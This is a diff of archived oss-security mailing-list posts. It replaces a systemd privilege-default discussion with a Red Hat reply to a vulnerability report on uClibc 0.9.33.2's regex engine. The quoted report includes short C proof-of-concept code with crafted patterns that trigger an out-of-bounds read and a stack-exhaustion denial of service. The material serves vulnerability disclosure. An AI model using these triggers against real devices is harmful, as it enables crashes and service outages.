@@ -1,48 +1,110 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/06/7
-Message-ID: <20170706121755.nhem2vlrtsvzr22g@perpetual.pseudorandom.co.uk>
-Date: Thu, 6 Jul 2017 13:17:55 +0100
-From: Simon McVittie <smcv@...ian.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/16/5
+Message-ID: <0271829c-ec94-244b-21db-d8804d6ace1a@redhat.com>
+Date: Fri, 16 Jun 2017 08:15:59 +0200
+From: Andrej Nemec <anemec@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: systemd fails to parse user that should run service
+Subject: Re: two vulns in uClibc-0.9.33.2
 Content-Type: text/plain; charset=utf-8
 
-On Wed, 05 Jul 2017 at 17:26:47 -0500, Patrick J. Volkerding wrote:
-> On 07/05/2017 04:14 PM, Robert Scheck wrote:
-> > +1 for both, the CVE and that this is a problem. The service should not be
-> > started with more (!) permissions simply if parsing username fails.
-> 
-> One would think that without any User= line specified, defaulting to
-> nobody:nogroup would be more sane than defaulting to root. Since the
-> User= mechanism exists, if you want something to run as root, you should
-> need to ask for it.
+Hello,
 
-System services running as root are the common case: it's extremely
-common for a system service to either run as root all the time (e.g.
-BlueZ, ConnMan, NetworkManager), or start as root, do some privileged
-setup and drop privileges (e.g. dbus-daemon --system boosts its own file
-descriptor rlimit to mitigate denial of service attacks, before dropping
-privileges to a non-root user with no capabilities except possibly
-CAP_AUDIT_WRITE). systemd units are analogous to LSB init scripts,
-which all start as root, and drop privileges internally if they want to.
+Unfortunately, CVE assignments are not done through this list anymore.
+You need to visit [1] and request the CVEs by filing out the form. Could
+you please look at it and let the list know about the assigned CVEs?
 
-Forcing User= to be explicitly given in every unit is certainly a design
-that the systemd developers could have chosen (dbus-daemon --system
-does make specifying a User compulsory in activatable system services'
-.service files, and will refuse to start the service without it). However,
-they didn't, and if they went back on that decision now, it would be a
-major compatibility break. You could call that a denial of service if
-you want to put it in more security-ish terms? :-)
+Thanks!
 
-Technically, I think the default is "don't change uid" rather than
-"change to root", although the practical effect is the same for pid
-1. systemd is also used as a per-user service manager, where User= would
-be inappropriate (and not work), and every service runs as the same uid
-as the `systemd --user` instance itself.
+[1] https://cveform.mitre.org/
 
-Dropping privileges to nobody:nogroup is inappropriate, because services
-running as nobody are not protected from other services running as nobody.
-If a service does not need special privileges, then it should run as a
-system user that is only used by that service.
+Best Regards,
 
-    S
+-- 
+Andrej Nemec, Red Hat Product Security
+3701 3214 E472 A9C3 EFBE 8A63 8904 44A1 D57B 6DDA
+
+
+On 06/16/2017 05:53 AM, fefe wrote:
+> I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
+>
+>
+> one is about line 2682 of get_subexp.c :
+>
+>
+> 		if (BE (bkref_str_off >= mctx->input.valid_len, 0))
+> 		{
+> 		  /* If we are at the end of the input, we cannot match.  */
+> 		  if (bkref_str_off >= mctx->input.len)
+> 		    break;
+>
+>
+> 		  err = extend_buffers (mctx);
+> 		  if (BE (err != REG1_NOERROR, 0))
+> 		    return err;
+>
+>
+> 		  buf = (const char *) re_string_get_buffer (&mctx->input);
+> 		}
+> 	      if (buf [bkref_str_off++] != buf[sl_str - 1])
+> 		break; /* We don't need to search this sub expression
+> 		
+> "bkref_str_off >= mctx->input.valid_len" , when  bkref_str_off == mctx->input.valid_len, "buf [bkref_str_off++] != buf[sl_str - 1]" case Out of one bit bounds read
+>
+>
+> The poc code like:
+> 	
+> 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+> 	{		
+>         	reg1match_t pmatch[1];
+> 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
+> 		regfree(&regtmp);
+> 	}
+>
+>
+>
+>
+>
+>
+> The another is aout line 1837 of regexce.c :
+>
+>
+> 		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int boundaries,
+> 			     int subexp_idx, int from_node, int bkref_idx)
+>                 .......
+>
+>
+> 		  cpos =
+> 		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
+> 						 dst, bkref_idx);
+>
+>
+> 		
+> check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack exhaustion.
+>
+>
+> The poc code like:	
+> 	
+> 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+> 	{		
+>         	reg1match_t pmatch[1];
+> 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
+> 		regfree(&regtmp);
+> 	}
+>
+>
+>
+>
+> A large number of embedded devices uses uclibc instead of glibc.
+> Could you assign CVE id for those?
+>
+>
+> Thank you
+>
+>
+> Benjin Liu
+> Codesafe Team of Qihoo 360
+
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
